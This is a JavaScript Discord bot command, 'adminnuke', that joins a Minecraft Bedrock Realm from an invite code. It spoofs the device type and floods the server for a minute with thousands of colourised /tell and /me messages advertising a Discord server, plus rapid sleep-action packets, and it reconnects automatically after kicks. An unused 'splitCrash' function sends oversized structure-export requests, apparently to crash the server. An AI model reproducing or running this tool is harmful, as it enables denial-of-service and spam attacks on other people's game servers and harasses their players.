const { EmbedBuilder, WebhookClient } = require('discord.js');
const bedrock = require('bedrock-protocol');
const { SlashCommandBuilder } = require('@discordjs/builders');
const fs = require('fs').promises;
const path = require('path');
const { Authflow} = require('prismarine-auth');

const blacklistPath = path.join(__dirname, '..', '..', 'data', 'blacklist.json');
const honeypotPath = path.join(__dirname, '..', '..', 'data', 'honeypot.json');
const adminFilePath = path.join(__dirname, '..', '..', 'data', 'admin.json');
const webhookLoggingClient = new WebhookClient({ url: '' });
const trollEmojie = "<:HDtroll:1246615956176769024>";
const loadingemoji = "<a:loading:1256535355138768906>";
const workedEmojie = "<a:Check:1256612972793565204>";
const errorEmojie = "<:deny:1256622572762562681>";
const lEmoji = '<a:DyingLaughing:1244399086061355090>';
const one = '<:reply:1258168210486726726>';
const second = '<:replycountinue:1258168190861709484>';

const deviceOptions = {
    'Unknown': 0,
    'Android': 1,
    'iOS': 2,
    'OSX': 3,
    'FireOS': 4,
    'GearVR': 5,
    'Hololens': 6,
    'Windows 10 (x64)': 7,
    'Windows 10 (x86)': 8,
    'Dedicated Server': 9,
    'TvOS': 10,
    'Orbis': 11,
    'Nintendo Switch': 12,
    'Xbox': 13,
    'Windows Phone': 14,
    'Linux': 15
};

let blacklistedUsers = new Set();
let honeypotRealms = new Set();
let adminUsers = new Set();

async function loadBlacklist() {
    try {
        const blacklistData = await fs.readFile(blacklistPath, 'utf-8');
        blacklistedUsers = new Set(JSON.parse(blacklistData));
    } catch (error) {
        console.error('Error loading blacklist:', error);
    }
}

async function loadHoneypot() {
    try {
        const honeypotData = await fs.readFile(honeypotPath, 'utf-8');
        honeypotRealms = new Set(JSON.parse(honeypotData));
    } catch (error) {
        console.error('Error loading honeypot file:', error);
    }
}

async function loadAdmins() {
    try {
        const adminData = await fs.readFile(adminFilePath, 'utf-8');
        adminUsers = new Set(JSON.parse(adminData));
    } catch (error) {
        console.error('Error loading admin file:', error);
    }
}

loadBlacklist();
loadHoneypot();
loadAdmins();

function parseKickMessage(message) {
    return message;
}

module.exports = {
    command: new SlashCommandBuilder()
        .setName('adminnuke')
        .setDescription('Spams realm with a message')
        .addStringOption(option =>
            option.setName('realmcode')
                .setDescription('Realm Code To Spam')
                .setRequired(true)
                .setMinLength(11)
                .setMaxLength(11)
        )
        .addStringOption(option =>
            option.setName('wisper')
                .setDescription('Wisper Spam')
                .setRequired(true)
        )
        .addStringOption(option =>
            option.setName('external')
                .setDescription('External Spam')
                .setRequired(true)
        )
        .addStringOption(option =>
            option.setName('device_os')
                .setDescription('The device to spoof as')
                .setRequired(true)
                .addChoices(
                    { name: 'Unknown', value: 'Unknown' },
                    { name: 'Android', value: 'Android' },
                    { name: 'Samsung Smart fridge', value: 'Android' },
                    { name: 'iOS', value: 'iOS' },
                    { name: 'Ocean Gate', value: 'OSX' },
                    { name: 'OSX (macOS)', value: 'OSX' },
                    { name: 'FireOS', value: 'FireOS' },
                    { name: 'GearVR', value: 'GearVR' },
                    { name: 'Hololens', value: 'Hololens' },
                    { name: 'Windows 10 (x64)', value: 'Windows 10 (x64)' },
                    { name: 'Windows 10 (x86)', value: 'Windows 10 (x86)' },
                    { name: 'Dedicated Server', value: 'Dedicated Server' },
                    { name: 'TvOS (Apple TV)', value: 'TvOS' },
                    { name: 'Orbis (PlayStation)', value: 'Orbis' },
                    { name: 'Nintendo Switch', value: 'Nintendo Switch' },
                    { name: 'Xbox', value: 'Xbox' },
                    { name: 'Windows Phone', value: 'Windows Phone' },
                    { name: 'Linux', value: 'Linux' }
                )
        ),
    callback: async (interaction) => {
        try {
            await interaction.deferReply({ ephemeral: false });

            if (!adminUsers.has(interaction.user.id)) {
                const embed = new EmbedBuilder()
                    .setColor('#ff0000')
                    .setTitle('Access Denied')
                    .setDescription(`${errorEmojie} This is an Admin Command ${errorEmojie}`);
                return interaction.editReply({ embeds: [embed], ephemeral: true });
            }

            const userId = interaction.user.id;
            const userTag = interaction.user.tag;
            const realmCode = interaction.options.getString('realmcode');
            const msg = interaction.options.getString('wisper');
            const externalMsg = interaction.options.getString('external');
            const deviceOS = interaction.options.getString('device_os');

            if (!msg || !externalMsg) {
                const errorEmbed = new EmbedBuilder()
                    .setColor('#ff0000')
                    .setTitle('Error')
                    .setDescription('One or more message parameters are missing.');
                return interaction.editReply({ embeds: [errorEmbed] });
            }

            const initialEmbed = new EmbedBuilder()
                .setTitle(`${trollEmojie} Nuking ${realmCode} ${trollEmojie}`)
                .setDescription(`Joined ${realmCode}`)
                .addFields(
                    { name: 'Device', value: deviceOS, inline: true },
                    { name: 'Connected', value: loadingemoji, inline: false },
                    { name: 'Spammed', value: loadingemoji, inline: false },
                    { name: 'Disconnected', value: loadingemoji, inline: false },
                    { name: 'Retries', value: '0', inline: true },
                    { name: 'Next Attempt', value: 'N/A', inline: true }
                )
                .setTimestamp();

            const message = await interaction.editReply({ embeds: [initialEmbed] });

            if (blacklistedUsers.has(userId)) {
                const embed = new EmbedBuilder()
                    .setColor('#ff0000')
                    .setTitle('Womp Womp')
                    .setDescription(`${lEmoji} You are Blacklisted ${lEmoji}`);
                await interaction.editReply({ embeds: [embed], ephemeral: true });

                const webhookEmbed = new EmbedBuilder()
                    .setTitle('Blacklist Check')
                    .setDescription(`User ${userTag} attempted to use the \`adminnuke\` command but is blacklisted.`)
                    .setColor('#ff0000')
                    .addFields(
                        { name: 'Realm Code', value: realmCode },
                        { name: 'Time', value: '60 seconds' },
                        { name: 'Device', value: deviceOS },
                        { name: 'MSG', value: msg },
                        { name: 'External MSG', value: externalMsg }
                    )
                    .setTimestamp();

                await webhookLoggingClient.send({ embeds: [webhookEmbed] });
                return;
            }

            let retryCount = 0;
            let disconnectReasonShown = false;  // Flag to track if disconnect reason has been shown

            async function connectToRealm() {
                try {
                    const authFlow = new Authflow('unique_identifier', './'); // no cache
                    const bedrockClient = bedrock.createClient({
                        authFlow: authFlow,
                        deviceOS: deviceOptions[deviceOS],
                        realms: {
                            realmInvite: `https://realms.gg/${realmCode}`
                        }
                    });
            
                    bedrockClient.on('start_game', async (packet) => {
                        initialEmbed.spliceFields(1, 1, { name: 'Connected', value: workedEmojie, inline: false });
                        await interaction.editReply({ embeds: [initialEmbed] });
            
                        const sendCommand = (command) => {
                            bedrockClient.queue('command_request', command);
                        };
            
                        const action_packet = {
                            runtime_entity_id: packet.runtime_entity_id,
                            position: { x: 0, y: 0, z: 0 },
                            result_position: { x: 0, y: 0, z: 0 },
                            face: 0
                        };
            
                        const inter = setInterval(() => {
                            sendSleepSpam(bedrockClient, action_packet);
                            spam(sendCommand, msg);
                            crash(sendCommand, externalMsg);
                        }, 136);
            
                        setTimeout(async () => {
                            clearInterval(inter);
                            bedrockClient.disconnect();
            
                            initialEmbed.spliceFields(2, 1, { name: 'Spammed', value: workedEmojie, inline: false });
                            initialEmbed.spliceFields(3, 1, { name: 'Disconnected', value: workedEmojie, inline: false });
                            await interaction.editReply({ embeds: [initialEmbed] });
            
                            console.log('Disconnected from', realmCode);
            
                            const webhookEmbed = new EmbedBuilder()
                                .setTitle('Realm Nuked')
                                .setDescription(`User ${userTag} used the \`adminnuke\` command.`)
                                .setColor('Green')
                                .addFields(
                                    { name: 'Realm Code', value: realmCode },
                                    { name: 'Time', value: '60 seconds' },
                                    { name: 'Device', value: deviceOS },
                                    { name: 'MSG', value: msg },
                                    { name: 'External MSG', value: externalMsg }
                                )
                                .setTimestamp();
            
                            await webhookLoggingClient.send({ embeds: [webhookEmbed] });
                        }, 60 * 1000);
                    });
            
                    bedrockClient.on('disconnect', async (packet) => {
                        if (!disconnectReasonShown) {
                            initialEmbed.setColor('#ff0000').addFields({ name: errorEmojie, value: 'Disconnected: ' + packet.reason, inline: false });
                            await interaction.editReply({ embeds: [initialEmbed] });
                            disconnectReasonShown = true;  // Set flag to true after showing disconnect reason
                        }
                         // tride to make a auto reconnect if the bot is not abel to join 
                        if (retryCount < 5) {
                            retryCount++;
                            let countdown = 8;
                            const countdownInterval = setInterval(async () => {
                                initialEmbed.spliceFields(4, 1, { name: 'Retries', value: retryCount.toString(), inline: true });
                                initialEmbed.spliceFields(5, 1, { name: 'Next Attempt', value: `${countdown} seconds`, inline: true });
                                await interaction.editReply({ embeds: [initialEmbed] });
                                countdown--;
                                if (countdown < 0) {
                                    clearInterval(countdownInterval);
                                    
                                    setTimeout(connectToRealm, 12000);
                                }
                            }, 1000); 
                        }
                    });
            
                    bedrockClient.on('kick', async (reason) => {
                        initialEmbed.setColor('#ff0000').spliceFields(3, 1,({ name: errorEmojie, value: parseKickMessage(reason.message), inline: false }));
                        await interaction.editReply({ embeds: [initialEmbed] });
                        if (retryCount < 5) {
                            retryCount++;
                            let countdown = 8;
                            const countdownInterval = setInterval(async () => {
                                initialEmbed.spliceFields(4, 1, { name: 'Retries', value: retryCount.toString(), inline: true });
                                initialEmbed.spliceFields(5, 1, { name: 'Next Attempt', value: `${countdown} seconds`, inline: true });
                                await interaction.editReply({ embeds: [initialEmbed] });
                                countdown--;
                                if (countdown < 0) {
                                    clearInterval(countdownInterval);
                                    // Versuch der erneuten Verbindung nach 8 Sekunden
                                    setTimeout(connectToRealm, 12000);
                                }
                            }, 1000); // Update every second
                        }
                    });
            
                    bedrockClient.on('error', async (err) => {
                        initialEmbed.setColor('#ff0000').spliceFields(3, 1,({ name: errorEmojie, value: err.message, inline: false }));
                        await interaction.editReply({ embeds: [initialEmbed] });
                        if (retryCount < 5) {
                            retryCount++;
                            let countdown = 8;
                            const countdownInterval = setInterval(async () => {
                                initialEmbed.spliceFields(4, 1, { name: 'Retries', value: retryCount.toString(), inline: true });
                                initialEmbed.spliceFields(5, 1, { name: 'Next Attempt', value: `${countdown} seconds`, inline: true });
                                await interaction.editReply({ embeds: [initialEmbed] });
                                countdown--;
                                if (countdown < 0) {
                                    clearInterval(countdownInterval);
                                    
                                    setTimeout(connectToRealm, 12000);
                                }
                            }, 1000);
                        }
                    });
            
                } catch (error) {
                    console.error('Discord API Error:', error);
                }
            }

            connectToRealm();

        } catch (error) {
            console.error('Unexpected error:', error);
        }
    }
};

function spam(sendCommand, msg) {
    for (let i = 0; i < 5000; i++) {  
        sendCommand({
            command: `/tell @a ${colorizeText(msg)} \n §c§l§ discord.gg/arasr`,
            origin: {
                type: 5,
                uuid: '',
                request_id: '',
            },
            internal: false,
            version: 66,
        });
    }
}

function crash(sendCommand, externalMsg) {
    for (let i = 0; i < 5000; i++) {  
        sendCommand({
            command: `/me ${colorizeText(externalMsg)} \n §c§l§ discord.gg/arasr`,
            origin: {
                type: 5,
                uuid: '',
                request_id: '',
            },
            internal: false,
            version: 66,
        });
    }
}

function splitCrash(bedrockClient) {
    let x = 0;
    let y = 0;
    let z = 0;
    let unique_id = -858993459156n;

    for (let i = 0; i < 50; i++) {
        bedrockClient.queue('structure_template_data_export_request', {
            name: `house${i}`,
            position: { x, y, z },
            settings: {
                palette_name: "",
                ignore_entities: false,
                non_ticking_players_and_ticking_areas: false,
                size: { x: 9999, y: 100, z: 9999 },
                structure_offset: { x: 9999, y: 50, z: 9999 },
                last_editing_player_unique_id: unique_id,
                rotation: 3,
                mirror: 3,
                animation_mode: 2,
                animation_duration: 999999,
                integrity: 1,
                seed: 0,
                pivot: { x: -9999, y: 64, z: 99999 }
            },
            request_type: 1
        });
    }
}

function sendSleepSpam(client, action_packet) {
    client.queue("player_action", {
        ...action_packet,
        action: "start_sleeping"
    });

    client.queue("player_action", {
        ...action_packet,
        action: "stop_sleeping"
    });
}


function colorizeText(text) {
    const words = text.split(' ');
    const coloredWords = words.map(word => {
        const colorCode = randomCode();
        return `${colorCode}${word}`;
    });
    return coloredWords.join(' ');
}

function randomCode() {
    const optionsString = "1234567890";
    const optionsArray = optionsString.split('');
    const randomIndex = Math.floor(Math.random() * optionsArray.length);
    const randomOption = optionsArray[randomIndex];
    return "§" + randomOption;
}
